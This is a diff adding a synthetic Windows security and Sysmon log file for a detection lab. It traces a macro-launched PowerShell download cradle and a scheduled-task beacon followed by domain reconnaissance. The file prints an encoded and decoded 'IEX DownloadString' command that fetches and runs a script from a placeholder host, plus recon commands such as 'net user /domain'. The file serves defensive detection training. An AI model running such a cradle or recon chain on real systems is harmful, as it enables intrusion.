@@ -1,0 +1,163 @@
+# ==============================================================================
+# SYNTHETIC DATA — DO NOT USE IN PRODUCTION
+# All entries are fabricated for portfolio/lab demonstration only.
+# Hostnames: generic placeholders (WORKSTATION-01, DC-01)
+# Usernames: LAB\user1, LAB\svc_account1
+# IPs: RFC 5737 documentation range (203.0.113.0/24)
+# SHA256 values: fabricated — not real malware hashes, not real IOCs
+# Encoded commands: synthetic base64 strings; decoded equivalents shown in comments
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# SCENARIO A: Office Macro → PowerShell Download Cradle (T1059.001 + T1105)
+#
+# Attack chain:
+#   WINWORD.EXE (user1 opens malicious .docm)
+#     └── cmd.exe  (macro spawns shell)
+#           └── powershell.exe -enc  (download cradle fetches stage-2 payload)
+#                 └── whoami.exe  (initial recon post-execution)
+#
+# Time window: 2024-11-18 10:23 UTC | Host: WORKSTATION-01 | User: LAB\user1
+# ------------------------------------------------------------------------------
+
+# [Event 1] Word spawns cmd.exe — macro execution begins
+TimeCreated=2024-11-18T10:23:09.441Z EventID=4688 Computer=WORKSTATION-01 Channel=Security
+SubjectUser=LAB\user1 IntegrityLevel=Medium
+ProcessId=0x1324 Image=C:\Windows\System32\cmd.exe
+ParentProcessId=0x2A4C ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE
+CommandLine=cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADkAOQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
+ParentCommandLine="WINWORD.EXE" /n "C:\Users\user1\Downloads\Q4_Bonus_Statement.docm"
+SHA256Image=c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2
+
+# [Event 2] cmd.exe spawns powershell.exe with obfuscation flags and encoded command
+TimeCreated=2024-11-18T10:23:11.847Z EventID=4688 Computer=WORKSTATION-01 Channel=Security
+SubjectUser=LAB\user1 IntegrityLevel=Medium
+ProcessId=0x1410 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessId=0x1324 ParentImage=C:\Windows\System32\cmd.exe
+CommandLine=powershell.exe  -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADkAOQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
+# DECODED (UTF-16LE): IEX (New-Object System.Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')
+ParentCommandLine=cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -EncodedCommand ...
+SHA256Image=d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4
+
+# [Event 3] PowerShell Script Block Logging — 4104 reveals decoded command
+TimeCreated=2024-11-18T10:23:12.103Z EventID=4104 Computer=WORKSTATION-01
+Channel=Microsoft-Windows-PowerShell/Operational
+ProcessId=0x1410 ScriptBlockId={A1B2C3D4-1111-2222-AAAA-1234567890AB}
+ScriptBlockText=IEX (New-Object System.Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')
+Path=(empty — direct encoded execution, no .ps1 file on disk)
+MessageNumber=1 MessageTotal=1
+# NOTE: 4104 is the critical detection event here. Without Script Block Logging,
+# the -EncodedCommand payload would not appear in any log in decoded form.
+
+# [Event 4] Sysmon Network Connection — powershell.exe reaches out to download host
+TimeCreated=2024-11-18T10:23:14.562Z EventID=3 Computer=WORKSTATION-01
+Channel=Microsoft-Windows-Sysmon/Operational
+ProcessId=0x1410 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User=LAB\user1 Protocol=tcp Initiated=true
+SourceIp=192.0.2.101 SourcePort=49823
+DestinationIp=203.0.113.99 DestinationPort=80
+DestinationHostname=203.0.113.99
+# NOTE: Outbound HTTP from powershell.exe direct to an IP (no hostname) is a
+# strong LOLBin/download-cradle indicator. Legitimate PowerShell admin scripts
+# rarely connect to raw IPs on port 80.
+
+# [Event 5] powershell.exe spawns whoami.exe — initial post-execution recon
+TimeCreated=2024-11-18T10:23:16.209Z EventID=4688 Computer=WORKSTATION-01 Channel=Security
+SubjectUser=LAB\user1 IntegrityLevel=Medium
+ProcessId=0x1598 Image=C:\Windows\System32\whoami.exe
+ParentProcessId=0x1410 ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine=whoami
+ParentCommandLine=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden ...
+SHA256Image=e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5
+
+# NOTE: Scenario A — WINWORD.EXE parent confirms macro delivery vector.
+# The 4104 event (Event 3) is the definitive evidence of a download cradle.
+# Five events in 7 seconds from office document open to outbound network connection.
+
+# ------------------------------------------------------------------------------
+# SCENARIO B: Scheduled Task PowerShell — Late-Night Recon (T1059.001 + T1087)
+#
+# Attack chain:
+#   svchost.exe (Task Scheduler host) at 02:47 UTC
+#     └── powershell.exe -ep bypass -w hidden -enc (scheduled persistence / C2 beacon)
+#           ├── whoami.exe
+#           ├── net.exe (net user /domain)
+#           ├── nltest.exe (/domain_trusts)
+#           ├── cmd.exe (ping DC-01)
+#           └── reg.exe (registry query for services)
+#
+# Time window: 2024-11-18 02:47 UTC | Host: WORKSTATION-01 | User: LAB\svc_account1
+# ANOMALY: Execution at 02:47 UTC — outside business hours; svc_account1 not expected
+#          to run interactive PowerShell sessions
+# ------------------------------------------------------------------------------
+
+# [Event 6] svchost.exe spawns powershell.exe — scheduled task fires at 02:47
+TimeCreated=2024-11-18T02:47:03.814Z EventID=4688 Computer=WORKSTATION-01 Channel=Security
+SubjectUser=LAB\svc_account1 IntegrityLevel=High
+ProcessId=0x1C40 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessId=0x0340 ParentImage=C:\Windows\System32\svchost.exe
+CommandLine=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -NoProfile -EncodedCommand cwB0AGEAcgB0AC0AcwBsAGUAZQBwACAAMQA7ACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQQA=
+# DECODED (UTF-16LE) [SYNTHETIC — demonstrates technique only]:
+#   Beacon/C2 check-in pattern targeting 203.0.113.99:4444
+#   Full decoded content withheld — demonstrates reverse-shell/C2 pattern
+ParentCommandLine=C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule
+SHA256Image=d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4
+
+# [Event 7] 4104 Script Block — decoded content captured by Script Block Logging
+TimeCreated=2024-11-18T02:47:04.021Z EventID=4104 Computer=WORKSTATION-01
+Channel=Microsoft-Windows-PowerShell/Operational
+ProcessId=0x1C40 ScriptBlockId={B2C3D4E5-3333-4444-BBBB-2345678901BC}
+ScriptBlockText=[SYNTHETIC — C2 beacon check-in pattern — decoded content omitted per data sanitization policy; demonstrates that 4104 captures encoded payloads]
+Path=(empty — scheduled task execution, no .ps1 file on disk)
+MessageNumber=1 MessageTotal=1
+
+# [Event 8] powershell.exe spawns whoami.exe — user context discovery
+TimeCreated=2024-11-18T02:47:09.332Z EventID=4688 Computer=WORKSTATION-01 Channel=Security
+SubjectUser=LAB\svc_account1 IntegrityLevel=High
+ProcessId=0x1D88 Image=C:\Windows\System32\whoami.exe
+ParentProcessId=0x1C40 ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine=whoami /all
+ParentCommandLine=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden ...
+SHA256Image=e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5
+
+# [Event 9] powershell.exe spawns net.exe — domain user enumeration
+TimeCreated=2024-11-18T02:47:12.559Z EventID=4688 Computer=WORKSTATION-01 Channel=Security
+SubjectUser=LAB\svc_account1 IntegrityLevel=High
+ProcessId=0x1EA4 Image=C:\Windows\System32\net.exe
+ParentProcessId=0x1C40 ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine=net user /domain
+ParentCommandLine=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden ...
+SHA256Image=f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6
+
+# [Event 10] powershell.exe spawns nltest.exe — domain trust enumeration
+TimeCreated=2024-11-18T02:47:18.774Z EventID=4688 Computer=WORKSTATION-01 Channel=Security
+SubjectUser=LAB\svc_account1 IntegrityLevel=High
+ProcessId=0x1F60 Image=C:\Windows\System32\nltest.exe
+ParentProcessId=0x1C40 ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine=nltest /domain_trusts
+ParentCommandLine=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden ...
+SHA256Image=a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7
+
+# [Event 11] powershell.exe spawns cmd.exe → ping DC-01 — network host discovery
+TimeCreated=2024-11-18T02:47:24.091Z EventID=4688 Computer=WORKSTATION-01 Channel=Security
+SubjectUser=LAB\svc_account1 IntegrityLevel=High
+ProcessId=0x2044 Image=C:\Windows\System32\cmd.exe
+ParentProcessId=0x1C40 ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine=cmd.exe /c ping -n 1 DC-01
+ParentCommandLine=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden ...
+SHA256Image=c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2
+
+# [Event 12] powershell.exe spawns reg.exe — service registry enumeration
+TimeCreated=2024-11-18T02:47:31.408Z EventID=4688 Computer=WORKSTATION-01 Channel=Security
+SubjectUser=LAB\svc_account1 IntegrityLevel=High
+ProcessId=0x2120 Image=C:\Windows\System32\reg.exe
+ParentProcessId=0x1C40 ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine=reg query HKLM\SYSTEM\CurrentControlSet\Services /s /f "powershell"
+ParentCommandLine=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden ...
+SHA256Image=b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8
+
+# NOTE: Scenario B — 5 recon child processes in 28 seconds from a scheduled task
+# execution at 02:47 UTC under svc_account1. The sequence whoami → net user /domain →
+# nltest /domain_trusts is a textbook Active Directory enumeration pattern.
+# The elevated IntegrityLevel=High for svc_account1 is also anomalous — service
+# accounts should rarely spawn interactive PowerShell with elevated integrity.
